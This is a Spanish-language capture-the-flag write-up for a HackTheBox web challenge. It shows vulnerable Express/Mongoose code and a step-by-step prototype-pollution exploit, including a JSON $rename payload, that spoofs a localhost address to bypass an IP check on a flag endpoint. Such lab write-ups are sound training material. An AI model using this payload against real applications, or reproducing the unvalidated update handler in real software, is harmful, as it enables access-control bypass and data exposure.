# Writeup - Secure Notes (HackTheBox)

**Máquina:** Secure Notes  
**Plataforma:** HackTheBox  
**IP:** 154.57.164.83:30936

## Resumen

Secure Notes es un challenge de web que explota **prototype pollution via `$rename` de Mongoose** para bypassear la verificación de IP localhost en el endpoint `/flag`. El ataque combina la inyección del operador `$rename` de MongoDB con la hidratación de documentos de Mongoose para contaminar `Object.prototype._peername.address` y suplantar la IP local.

---

## 1. Reconocimiento

### Endpoints

| Método | Ruta | Descripción |
|--------|------|-------------|
| GET | `/` | Página principal |
| GET | `/flag` | Devuelve la flag solo si `remoteAddress === '127.0.0.1'` |
| POST | `/create` | Crea una nota |
| GET | `/get/:noteId` | Obtiene una nota por ID |
| POST | `/update` | Actualiza una nota |

### Vulnerabilidad en `/update`

```javascript
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```

`req.body` se pasa directamente como update a `findByIdAndUpdate`, permitiendo inyectar operadores de MongoDB como `$rename`.

### Protección `/flag`

```javascript
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});
```

Solo accesible desde localhost.

---

## 2. Explotación — Prototype Pollution

### Paso 1: Crear una nota

Desde la interfaz web, hacer clic en **"+ New Note"** y crear una nota con:
- **Title:** `127.0.0.1`
- **Content:** `IPv4`

### Paso 2: Inyectar `$rename`

Configurar **Burp Suite** como proxy e interceptar el tráfico. Desde la web, crear otra nota cualquiera. Burp capturará la petición POST a `/update`.

Enviar la petición a **Repeater** y modificar el cuerpo JSON para inyectar el operador `$rename`:

```json
{
  "noteId": "<ID de la nota creada en paso 1>",
  "$rename": {
    "title": "__proto__._peername.address",
    "content": "__proto__._peername.family"
  }
}
```

Enviar la petición. Esto renombra los campos en MongoDB, creando la estructura:
```
{ "__proto__": { "_peername": { "address": "127.0.0.1", "family": "IPv4" } } }
```

El operador `$rename` escapa el filtro `strict: true` de Mongoose porque se ejecuta del lado del servidor MongoDB.

### Paso 3: Hidratar el documento

Hacer clic en la nota creada desde la interfaz web. Al cargar la nota, el navegador hace un GET a `/get/<ID>` y Mongoose hidrata el documento, contaminando `Object.prototype`:
- `Object.prototype._peername.address = "127.0.0.1"`
- `Object.prototype._peername.family = "IPv4"`

### Paso 4: Obtener la flag

Node.js internamente lee `socket._peername.address` para obtener `remoteAddress`. Como `_peername` no está definido en el socket, JavaScript lo busca en la cadena de prototipos hasta `Object.prototype`, donde ahora existe.

En la consola del navegador (F12 → Console), ejecutar:

```javascript
fetch('/flag').then(r => r.text()).then(console.log)
```

O simplemente navegar a la URL `/flag` en otra pestaña. El servidor ve `remoteAddress === "127.0.0.1"` y devuelve la flag.

---

## Resumen de la cadena de ataque

| Paso | Técnica | Resultado |
|-------|---------|-----------|
| 1 | Crear nota con `title=127.0.0.1`, `content=IPv4` | Nota en MongoDB |
| 2 | `$rename` `title` → `__proto__._peername.address`, `content` → `__proto__._peername.family` | Campos renombrados en MongoDB |
| 3 | Fetch de la nota vía `/get` | Mongoose hidrata el documento → prototype pollution |
| 4 | GET `/flag` | `remoteAddress` resuelve a `127.0.0.1` por prototype chain → flag `<REDACTED>` |
